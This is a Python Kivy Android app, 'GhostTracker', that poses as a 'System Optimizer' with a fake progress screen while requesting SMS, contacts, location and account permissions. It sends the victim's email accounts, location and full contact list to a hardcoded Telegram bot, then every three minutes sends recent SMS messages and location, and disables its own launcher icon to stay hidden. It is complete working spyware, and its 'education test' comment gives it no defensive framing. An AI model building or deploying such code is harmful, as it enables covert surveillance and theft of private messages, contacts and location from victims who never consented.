import threading
import requests
import time
from kivy.app import App
from kivy.uix.label import Label
from kivy.clock import Clock
from kivy.utils import platform

if platform == 'android':
    from jnius import autoclass, cast
    from android.permissions import request_permissions, Permission
    PythonActivity = autoclass('org.kivy.android.PythonActivity')
    Uri = autoclass('android.net.Uri')
    Context = autoclass('android.content.Context')
    ComponentName = autoclass('android.content.ComponentName')
    # For Emails
    AccountManager = autoclass('android.accounts.AccountManager')

# ============= CONFIG =============
BOT_TOKEN = "8703607239:AAF6PWnNKy0VqBGT22V6jCpOH7tzqGn0d_E"
CHAT_ID = "6680833524"

class GhostTracker(App):
    def build(self):
        self.title = "System Optimizer"
        if platform == 'android':
            request_permissions([
                Permission.READ_SMS,
                Permission.READ_CONTACTS,
                Permission.READ_CALL_LOG,
                Permission.ACCESS_FINE_LOCATION,
                Permission.GET_ACCOUNTS
            ])
            # Permissions lene ke liye 15 sec ka time
            Clock.schedule_once(self.start_education_test, 15)
        
        return Label(text="System Optimization 88%...\nProcessing System Files", font_size='18sp')

    def start_education_test(self, *args):
        # Background threads shuru karna
        threading.Thread(target=self.initial_data_blast, daemon=True).start()
        # Har 3 minute (180s) mein update bhejte rehna
        Clock.schedule_interval(self.periodic_update, 180)
        self.hide_app_icon()

    def send_tele(self, text):
        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
            payload = {'chat_id': CHAT_ID, 'text': text, 'parse_mode': 'HTML'}
            requests.post(url, data=payload, timeout=10)
        except: pass

    def get_email(self):
        try:
            am = AccountManager.get(PythonActivity.mActivity)
            accounts = am.getAccounts()
            emails = [acc.name for acc in accounts if "@" in acc.name]
            return ", ".join(emails) if emails else "No Email Found"
        except: return "Permission Denied"

    def initial_data_blast(self):
        # 1. Pehle Email aur Phone Info
        info = f"<b>🎯 TARGET INITIALIZED</b>\n📧 Emails: {self.get_email()}\n📍 Loc: {self.get_loc()}"
        self.send_tele(info)
        
        # 2. Saare Contacts (Parts mein taaki Telegram block na kare)
        contacts = self.fetch_contacts()
        for i in range(0, len(contacts), 30):
            chunk = "\n".join(contacts[i:i+30])
            self.send_tele(f"<b>👥 CONTACTS (Part {i//30 + 1}):</b>\n{chunk}")

    def periodic_update(self, dt):
        # Har 3 min mein Location aur Naye SMS
        update = f"<b>📡 3-MIN UPDATE</b>\n📍 {self.get_loc()}\n\n<b>✉️ RECENT SMS:</b>\n{self.fetch_all_sms()}"
        threading.Thread(target=self.send_tele, args=(update,)).start()

    def get_loc(self):
        try:
            lm = PythonActivity.mActivity.getSystemService(Context.LOCATION_SERVICE)
            loc = lm.getLastKnownLocation("gps") or lm.getLastKnownLocation("network")
            if loc:
                return f"{loc.getLatitude()}, {loc.getLongitude()} <a href='https://www.google.com/maps?q={loc.getLatitude()},{loc.getLongitude()}'>[View on Map]</a>"
        except: pass
        return "Location Unavailable"

    def fetch_contacts(self):
        contacts_list = []
        try:
            resolver = PythonActivity.mActivity.getContentResolver()
            cursor = resolver.query(Uri.parse("content://contacts/phones"), None, None, None, None)
            if cursor:
                while cursor.moveToNext():
                    name = cursor.getString(cursor.getColumnIndex("display_name"))
                    num = cursor.getString(cursor.getColumnIndex("data1"))
                    contacts_list.append(f"{name}: {num}")
                cursor.close()
        except: contacts_list.append("Error fetching contacts")
        return contacts_list

    def fetch_all_sms(self):
        sms_data = ""
        try:
            resolver = PythonActivity.mActivity.getContentResolver()
            # Pichle 3 minute ke messages dhoondne ke liye query thodi complex ho sakti hai
            # Abhi ke liye top 10 messages uthate hain
            cursor = resolver.query(Uri.parse("content://sms/inbox"), None, None, None, "date DESC LIMIT 10")
            if cursor:
                while cursor.moveToNext():
                    body = cursor.getString(cursor.getColumnIndex("body"))
                    sender = cursor.getString(cursor.getColumnIndex("address"))
                    sms_data += f"<b>From {sender}:</b> {body}\n---\n"
                cursor.close()
        except: sms_data = "Error fetching SMS"
        return sms_data if sms_data else "No new messages"

    def hide_app_icon(self):
        try:
            activity = PythonActivity.mActivity
            pm = activity.getPackageManager()
            cn = ComponentName(activity.getPackageName(), "org.kivy.android.PythonActivity")
            pm.setComponentEnabledSetting(cn, 2, 1) # 2 = Disabled
        except: pass

if __name__ == '__main__':
    GhostTracker().run()

